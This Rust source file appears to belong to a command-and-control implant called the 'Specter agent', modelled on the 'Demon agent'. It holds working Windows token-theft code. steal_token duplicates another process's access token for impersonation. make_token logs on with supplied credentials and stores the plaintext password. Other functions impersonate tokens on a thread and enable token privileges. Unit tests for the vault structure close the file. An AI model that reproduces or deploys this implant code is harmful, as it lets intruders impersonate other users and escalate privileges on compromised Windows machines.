//! Token vault for the Specter agent.
//!
//! Maintains an in-memory collection of stolen and fabricated Windows tokens,
//! mirroring the Demon agent's `Instance->Tokens` vault.  On Windows the vault
//! holds real `HANDLE` values; on other platforms a lightweight stub is provided
//! so the command handlers can compile and return appropriate error responses.

// ─── Token types ────────────────────────────────────────────────────────────

/// How a token was obtained.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u16)]
pub enum TokenType {
    /// Stolen from a remote process via `OpenProcessToken` + `DuplicateTokenEx`.
    Stolen = 0x1,
    /// Created via `LogonUserW` (network logon).
    MakeNetwork = 0x2,
}

impl TokenType {
    /// Convert from the wire representation.
    pub fn from_u32(v: u32) -> Option<Self> {
        match v {
            0x1 => Some(Self::Stolen),
            0x2 => Some(Self::MakeNetwork),
            _ => None,
        }
    }
}

/// A single entry in the token vault.
#[derive(Debug, Clone)]
pub struct TokenEntry {
    /// Opaque token handle. On Windows this is a `HANDLE` (pointer-sized),
    /// on non-Windows stubs it is always zero.
    pub handle: usize,
    /// `DOMAIN\User` display string.
    pub domain_user: String,
    /// PID of the process the token was stolen from (0 for make tokens).
    pub process_id: u32,
    /// How the token was obtained.
    pub token_type: TokenType,
    /// Credentials stored for make tokens (domain, user, password).
    pub credentials: Option<MakeCredentials>,
}

/// Credentials used to create a make-token via `LogonUserW`.
#[derive(Debug, Clone)]
pub struct MakeCredentials {
    pub domain: String,
    pub user: String,
    pub password: String,
}

// ─── Token vault ────────────────────────────────────────────────────────────

/// In-memory vault of Windows access tokens.
///
/// Token IDs are 0-based indices into the vault.  When a token is removed, its
/// slot is set to `None` so that existing IDs remain stable.
#[derive(Debug)]
pub struct TokenVault {
    /// Sparse list of tokens (removed entries are `None`).
    tokens: Vec<Option<TokenEntry>>,
    /// Index of the currently impersonated token, if any.
    impersonating: Option<usize>,
}

impl Default for TokenVault {
    fn default() -> Self {
        Self::new()
    }
}

impl TokenVault {
    /// Create an empty vault.
    pub fn new() -> Self {
        Self { tokens: Vec::new(), impersonating: None }
    }

    /// Add a token to the vault and return its ID (0-based index).
    pub fn add(&mut self, entry: TokenEntry) -> u32 {
        // Reuse a removed slot if available.
        for (i, slot) in self.tokens.iter_mut().enumerate() {
            if slot.is_none() {
                *slot = Some(entry);
                #[allow(clippy::cast_possible_truncation)]
                return i as u32;
            }
        }
        let id = self.tokens.len();
        self.tokens.push(Some(entry));
        #[allow(clippy::cast_possible_truncation)]
        (id as u32)
    }

    /// Get a reference to a token by ID.
    pub fn get(&self, id: u32) -> Option<&TokenEntry> {
        self.tokens.get(id as usize).and_then(|s| s.as_ref())
    }

    /// Remove a token by ID.  Returns `true` if the token existed.
    ///
    /// On Windows, callers are responsible for closing the underlying handle
    /// before calling this method.
    pub fn remove(&mut self, id: u32) -> bool {
        let idx = id as usize;
        if idx < self.tokens.len() && self.tokens[idx].is_some() {
            // If we're removing the impersonated token, clear impersonation.
            if self.impersonating == Some(idx) {
                self.impersonating = None;
            }
            self.tokens[idx] = None;
            true
        } else {
            false
        }
    }

    /// Clear all tokens from the vault.
    ///
    /// On Windows, callers are responsible for closing underlying handles first.
    pub fn clear(&mut self) {
        self.tokens.clear();
        self.impersonating = None;
    }

    /// Iterate over all live `(id, entry)` pairs.
    pub fn iter(&self) -> impl Iterator<Item = (u32, &TokenEntry)> {
        self.tokens.iter().enumerate().filter_map(|(i, slot)| {
            #[allow(clippy::cast_possible_truncation)]
            slot.as_ref().map(|e| (i as u32, e))
        })
    }

    /// Number of live tokens in the vault.
    pub fn len(&self) -> usize {
        self.tokens.iter().filter(|s| s.is_some()).count()
    }

    /// Whether the vault is empty.
    pub fn is_empty(&self) -> bool {
        self.len() == 0
    }

    /// Set the impersonating token index.
    pub fn set_impersonating(&mut self, id: Option<u32>) {
        self.impersonating = id.map(|i| i as usize);
    }

    /// Get the currently impersonated token ID, if any.
    pub fn impersonating(&self) -> Option<u32> {
        #[allow(clippy::cast_possible_truncation)]
        self.impersonating.map(|i| i as u32)
    }

    /// Check whether a given token ID is the currently impersonated token.
    pub fn is_impersonating(&self, id: u32) -> bool {
        self.impersonating == Some(id as usize)
    }
}

// ─── Windows native token operations ────────────────────────────────────────

#[cfg(windows)]
#[allow(unsafe_code)]
pub mod native {
    //! Windows-native token manipulation via `windows-sys`.

    use std::mem;
    use std::ptr;

    use windows_sys::Win32::Foundation::{
        BOOL, CloseHandle, FALSE, GetLastError, HANDLE, LUID, TRUE,
    };
    use windows_sys::Win32::Security::{
        AdjustTokenPrivileges, DuplicateTokenEx, GetTokenInformation,
        LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, LUID_AND_ATTRIBUTES, LogonUserW,
        LookupAccountSidW, LookupPrivilegeNameW, LookupPrivilegeValueW, OpenProcessToken,
        OpenThreadToken, RevertToSelf, SE_PRIVILEGE_ENABLED, SE_PRIVILEGE_ENABLED_BY_DEFAULT,
        SID_NAME_USE, SecurityImpersonation, SetThreadToken, TOKEN_ADJUST_PRIVILEGES,
        TOKEN_ALL_ACCESS, TOKEN_ASSIGN_PRIMARY, TOKEN_DUPLICATE, TOKEN_ELEVATION,
        TOKEN_IMPERSONATE, TOKEN_PRIVILEGES, TOKEN_QUERY, TOKEN_USER, TokenElevation,
        TokenImpersonation, TokenPrivileges, TokenUser,
    };
    use windows_sys::Win32::System::Threading::{
        GetCurrentProcess, GetCurrentProcessId, GetCurrentThread, OpenProcess,
        PROCESS_QUERY_INFORMATION,
    };

    use super::{MakeCredentials, TokenEntry, TokenType};

    /// Steal a token from a target process.
    ///
    /// Opens the process token, duplicates it as an impersonation token,
    /// and returns a `TokenEntry` ready for vault insertion.
    pub fn steal_token(target_pid: u32, _target_handle: u32) -> Result<TokenEntry, u32> {
        let mut process_handle: HANDLE = 0;
        let mut token_handle: HANDLE = 0;
        let mut dup_token: HANDLE = 0;

        unsafe {
            // Open the target process.
            process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
            if process_handle == 0 {
                return Err(GetLastError());
            }

            // Open the process token.
            if OpenProcessToken(process_handle, TOKEN_DUPLICATE | TOKEN_QUERY, &mut token_handle)
                == FALSE
            {
                let err = GetLastError();
                CloseHandle(process_handle);
                return Err(err);
            }

            // Duplicate as an impersonation token.
            if DuplicateTokenEx(
                token_handle,
                TOKEN_ALL_ACCESS,
                ptr::null(),
                SecurityImpersonation,
                TokenImpersonation,
                &mut dup_token,
            ) == FALSE
            {
                let err = GetLastError();
                CloseHandle(token_handle);
                CloseHandle(process_handle);
                return Err(err);
            }

            CloseHandle(token_handle);
            CloseHandle(process_handle);
        }

        let domain_user = query_token_user(dup_token).unwrap_or_else(|| String::from("UNKNOWN"));

        Ok(TokenEntry {
            handle: dup_token as usize,
            domain_user,
            process_id: target_pid,
            token_type: TokenType::Stolen,
            credentials: None,
        })
    }

    /// Create a token via `LogonUserW`.
    pub fn make_token(
        domain: &str,
        user: &str,
        password: &str,
        logon_type: u32,
    ) -> Result<TokenEntry, u32> {
        let domain_w: Vec<u16> = domain.encode_utf16().chain(std::iter::once(0)).collect();
        let user_w: Vec<u16> = user.encode_utf16().chain(std::iter::once(0)).collect();
        let password_w: Vec<u16> = password.encode_utf16().chain(std::iter::once(0)).collect();

        let mut token_handle: HANDLE = 0;

        unsafe {
            if LogonUserW(
                user_w.as_ptr(),
                domain_w.as_ptr(),
                password_w.as_ptr(),
                logon_type,
                LOGON32_PROVIDER_DEFAULT,
                &mut token_handle,
            ) == FALSE
            {
                return Err(GetLastError());
            }
        }

        let domain_user = format!("{domain}\\{user}");

        Ok(TokenEntry {
            handle: token_handle as usize,
            domain_user,
            process_id: unsafe { GetCurrentProcessId() },
            token_type: TokenType::MakeNetwork,
            credentials: Some(MakeCredentials {
                domain: domain.to_string(),
                user: user.to_string(),
                password: password.to_string(),
            }),
        })
    }

    /// Impersonate a token on the current thread.
    pub fn impersonate_token(handle: usize) -> Result<(), u32> {
        unsafe {
            if SetThreadToken(ptr::null(), handle as HANDLE) == FALSE {
                return Err(GetLastError());
            }
        }
        Ok(())
    }

    /// Revert the current thread to its original token.
    pub fn revert_to_self() -> Result<(), u32> {
        unsafe {
            if RevertToSelf() == FALSE {
                return Err(GetLastError());
            }
        }
        Ok(())
    }

    /// Query whether the given token is elevated.
    pub fn is_token_elevated(handle: usize) -> bool {
        let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
        let mut ret_len: u32 = 0;
        unsafe {
            if GetTokenInformation(
                handle as HANDLE,
                TokenElevation,
                &mut elevation as *mut _ as *mut _,
                mem::size_of::<TOKEN_ELEVATION>() as u32,
                &mut ret_len,
            ) == FALSE
            {
                return false;
            }
        }
        elevation.TokenIsElevated != 0
    }

    /// Query the `DOMAIN\User` string from a token handle.
    pub fn query_token_user(handle: HANDLE) -> Option<String> {
        let mut needed: u32 = 0;

        // First call to get required buffer size.
        unsafe {
            GetTokenInformation(handle, TokenUser, ptr::null_mut(), 0, &mut needed);
        }
        if needed == 0 {
            return None;
        }

        let mut buf = vec![0u8; needed as usize];
        unsafe {
            if GetTokenInformation(handle, TokenUser, buf.as_mut_ptr().cast(), needed, &mut needed)
                == FALSE
            {
                return None;
            }
        }

        let token_user: &TOKEN_USER = unsafe { &*(buf.as_ptr().cast()) };
        let sid = token_user.User.Sid;

        // Resolve SID to account name.
        let mut user_len: u32 = 256;
        let mut domain_len: u32 = 256;
        let mut user_buf = vec![0u16; user_len as usize];
        let mut domain_buf = vec![0u16; domain_len as usize];
        let mut sid_type: SID_NAME_USE = 0;

        unsafe {
            if LookupAccountSidW(
                ptr::null(),
                sid,
                user_buf.as_mut_ptr(),
                &mut user_len,
                domain_buf.as_mut_ptr(),
                &mut domain_len,
                &mut sid_type,
            ) == FALSE
            {
                return None;
            }
        }

        let domain = String::from_utf16_lossy(&domain_buf[..domain_len as usize]);
        let user = String::from_utf16_lossy(&user_buf[..user_len as usize]);
        Some(format!("{domain}\\{user}"))
    }

    /// Get the current thread or process token handle.
    pub fn current_token_handle() -> Result<HANDLE, u32> {
        let mut handle: HANDLE = 0;
        unsafe {
            // Try thread token first (if impersonating).
            if OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &mut handle) != FALSE {
                return Ok(handle);
            }
            // Fall back to process token.
            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut handle) == FALSE {
                return Err(GetLastError());
            }
        }
        Ok(handle)
    }

    /// Query current token user string and elevation status.
    pub fn get_uid() -> Result<(bool, String), u32> {
        let handle = current_token_handle()?;
        let elevated = is_token_elevated(handle as usize);
        let user = query_token_user(handle).unwrap_or_else(|| String::from("UNKNOWN"));
        unsafe {
            CloseHandle(handle);
        }
        Ok((elevated, user))
    }

    /// List privileges on the current token.
    ///
    /// Returns `Vec<(privilege_name, attributes)>`.
    pub fn list_privileges() -> Result<Vec<(String, u32)>, u32> {
        let handle = current_token_handle()?;
        let mut needed: u32 = 0;

        // Get required size.
        unsafe {
            GetTokenInformation(handle, TokenPrivileges, ptr::null_mut(), 0, &mut needed);
        }
        if needed == 0 {
            unsafe { CloseHandle(handle) };
            return Err(unsafe { GetLastError() });
        }

        let mut buf = vec![0u8; needed as usize];
        unsafe {
            if GetTokenInformation(
                handle,
                TokenPrivileges,
                buf.as_mut_ptr().cast(),
                needed,
                &mut needed,
            ) == FALSE
            {
                let err = GetLastError();
                CloseHandle(handle);
                return Err(err);
            }
        }

        let privs: &TOKEN_PRIVILEGES = unsafe { &*(buf.as_ptr().cast()) };
        let count = privs.PrivilegeCount as usize;
        let privileges = unsafe { std::slice::from_raw_parts(privs.Privileges.as_ptr(), count) };

        let mut result = Vec::with_capacity(count);
        for laa in privileges {
            let name = lookup_privilege_name(&laa.Luid);
            result.push((name, laa.Attributes));
        }

        unsafe { CloseHandle(handle) };
        Ok(result)
    }

    /// Enable a privilege by name on the current token.
    pub fn enable_privilege(priv_name: &str) -> Result<bool, u32> {
        let handle = current_token_handle()?;
        // Need TOKEN_ADJUST_PRIVILEGES.
        let mut adj_handle: HANDLE = 0;
        unsafe {
            if OpenThreadToken(
                GetCurrentThread(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                TRUE,
                &mut adj_handle,
            ) == FALSE
            {
                if OpenProcessToken(
                    GetCurrentProcess(),
                    TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                    &mut adj_handle,
                ) == FALSE
                {
                    CloseHandle(handle);
                    return Err(GetLastError());
                }
            }
            CloseHandle(handle);
        }

        let name_w: Vec<u16> = priv_name.encode_utf16().chain(std::iter::once(0)).collect();
        let mut luid = LUID { LowPart: 0, HighPart: 0 };

        unsafe {
            if LookupPrivilegeValueW(ptr::null(), name_w.as_ptr(), &mut luid) == FALSE {
                CloseHandle(adj_handle);
                return Err(GetLastError());
            }
        }

        let mut tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
        };

        unsafe {
            if AdjustTokenPrivileges(
                adj_handle,
                FALSE,
                &mut tp,
                0,
                ptr::null_mut(),
                ptr::null_mut(),
            ) == FALSE
            {
                let err = GetLastError();
                CloseHandle(adj_handle);
                return Err(err);
            }
            // Check if the adjustment actually took effect.
            let err = GetLastError();
            CloseHandle(adj_handle);
            // ERROR_NOT_ALL_ASSIGNED = 1300
            Ok(err != 1300)
        }
    }

    /// Close a token handle.
    pub fn close_token_handle(handle: usize) {
        if handle != 0 {
            unsafe {
                CloseHandle(handle as HANDLE);
            }
        }
    }

    /// Look up a privilege name from its LUID.
    fn lookup_privilege_name(luid: &LUID) -> String {
        let mut name_buf = vec![0u16; 256];
        let mut name_len: u32 = 256;
        unsafe {
            if LookupPrivilegeNameW(ptr::null(), luid, name_buf.as_mut_ptr(), &mut name_len)
                == FALSE
            {
                return format!("LUID({},{})", luid.LowPart, luid.HighPart);
            }
        }
        String::from_utf16_lossy(&name_buf[..name_len as usize])
    }
}

// ─── Non-Windows stubs ──────────────────────────────────────────────────────

#[cfg(not(windows))]
pub mod native {
    //! Stub implementations for non-Windows platforms.
    //!
    //! Token manipulation is a Windows-only capability.  These stubs allow the
    //! code to compile on Linux/macOS for cross-compile testing, but all
    //! operations return errors.

    use super::TokenEntry;

    /// Windows error code for "not supported".
    const ERROR_NOT_SUPPORTED: u32 = 50;

    /// Stub: always returns `Err`.
    pub fn steal_token(_target_pid: u32, _target_handle: u32) -> Result<TokenEntry, u32> {
        Err(ERROR_NOT_SUPPORTED)
    }

    /// Stub: always returns `Err`.
    pub fn make_token(
        _domain: &str,
        _user: &str,
        _password: &str,
        _logon_type: u32,
    ) -> Result<TokenEntry, u32> {
        Err(ERROR_NOT_SUPPORTED)
    }

    /// Stub: always returns `Err`.
    pub fn impersonate_token(_handle: usize) -> Result<(), u32> {
        Err(ERROR_NOT_SUPPORTED)
    }

    /// Stub: always returns `Err`.
    pub fn revert_to_self() -> Result<(), u32> {
        Err(ERROR_NOT_SUPPORTED)
    }

    /// Stub: always returns `false`.
    pub fn is_token_elevated(_handle: usize) -> bool {
        false
    }

    /// Stub: get current user identity.
    pub fn get_uid() -> Result<(bool, String), u32> {
        let user = std::env::var("USER").unwrap_or_else(|_| String::from("unknown"));
        Ok((false, format!("WORKGROUP\\{user}")))
    }

    /// Stub: always returns empty list.
    pub fn list_privileges() -> Result<Vec<(String, u32)>, u32> {
        Ok(Vec::new())
    }

    /// Stub: always returns `Err`.
    pub fn enable_privilege(_priv_name: &str) -> Result<bool, u32> {
        Err(ERROR_NOT_SUPPORTED)
    }

    /// Stub: no-op.
    pub fn close_token_handle(_handle: usize) {}
}

// ─── Tests ──────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn vault_add_and_get() {
        let mut vault = TokenVault::new();
        let entry = TokenEntry {
            handle: 0x1234,
            domain_user: "DOMAIN\\user".to_string(),
            process_id: 100,
            token_type: TokenType::Stolen,
            credentials: None,
        };
        let id = vault.add(entry);
        assert_eq!(id, 0);
        let got = vault.get(id);
        assert!(got.is_some());
        assert_eq!(got.map(|e| &e.domain_user).unwrap(), "DOMAIN\\user");
    }

    #[test]
    fn vault_remove() {
        let mut vault = TokenVault::new();
        let entry = TokenEntry {
            handle: 0,
            domain_user: "A\\B".to_string(),
            process_id: 1,
            token_type: TokenType::Stolen,
            credentials: None,
        };
        let id = vault.add(entry);
        assert!(vault.remove(id));
        assert!(vault.get(id).is_none());
        // Removing again returns false.
        assert!(!vault.remove(id));
    }

    #[test]
    fn vault_reuses_removed_slots() {
        let mut vault = TokenVault::new();
        let mk = |pid: u32| TokenEntry {
            handle: 0,
            domain_user: format!("D\\U{pid}"),
            process_id: pid,
            token_type: TokenType::Stolen,
            credentials: None,
        };
        let id0 = vault.add(mk(0));
        let _id1 = vault.add(mk(1));
        vault.remove(id0);
        let id2 = vault.add(mk(2));
        // Should reuse slot 0.
        assert_eq!(id2, 0);
        assert_eq!(vault.get(id2).map(|e| e.process_id), Some(2));
    }

    #[test]
    fn vault_clear() {
        let mut vault = TokenVault::new();
        let entry = TokenEntry {
            handle: 0,
            domain_user: "A\\B".to_string(),
            process_id: 1,
            token_type: TokenType::Stolen,
            credentials: None,
        };
        vault.add(entry);
        vault.set_impersonating(Some(0));
        vault.clear();
        assert!(vault.is_empty());
        assert!(vault.impersonating().is_none());
    }

    #[test]
    fn vault_iter() {
        let mut vault = TokenVault::new();
        let mk = |pid: u32| TokenEntry {
            handle: 0,
            domain_user: format!("D\\U{pid}"),
            process_id: pid,
            token_type: TokenType::Stolen,
            credentials: None,
        };
        vault.add(mk(10));
        vault.add(mk(20));
        vault.add(mk(30));
        vault.remove(1); // Remove middle.
        let ids: Vec<u32> = vault.iter().map(|(id, _)| id).collect();
        assert_eq!(ids, vec![0, 2]);
    }

    #[test]
    fn vault_impersonation_tracking() {
        let mut vault = TokenVault::new();
        let entry = TokenEntry {
            handle: 0,
            domain_user: "A\\B".to_string(),
            process_id: 1,
            token_type: TokenType::MakeNetwork,
            credentials: None,
        };
        let id = vault.add(entry);
        assert!(!vault.is_impersonating(id));
        vault.set_impersonating(Some(id));
        assert!(vault.is_impersonating(id));
        assert_eq!(vault.impersonating(), Some(id));
        // Removing the impersonated token clears impersonation.
        vault.remove(id);
        assert!(vault.impersonating().is_none());
    }

    #[test]
    fn token_type_from_u32() {
        assert_eq!(TokenType::from_u32(0x1), Some(TokenType::Stolen));
        assert_eq!(TokenType::from_u32(0x2), Some(TokenType::MakeNetwork));
        assert_eq!(TokenType::from_u32(0x3), None);
    }

    #[test]
    fn vault_len_and_is_empty() {
        let mut vault = TokenVault::new();
        assert!(vault.is_empty());
        assert_eq!(vault.len(), 0);
        let entry = TokenEntry {
            handle: 0,
            domain_user: "D\\U".to_string(),
            process_id: 1,
            token_type: TokenType::Stolen,
            credentials: None,
        };
        vault.add(entry);
        assert!(!vault.is_empty());
        assert_eq!(vault.len(), 1);
    }

    #[test]
    fn vault_get_nonexistent_returns_none() {
        let vault = TokenVault::new();
        assert!(vault.get(0).is_none());
        assert!(vault.get(999).is_none());
    }
}
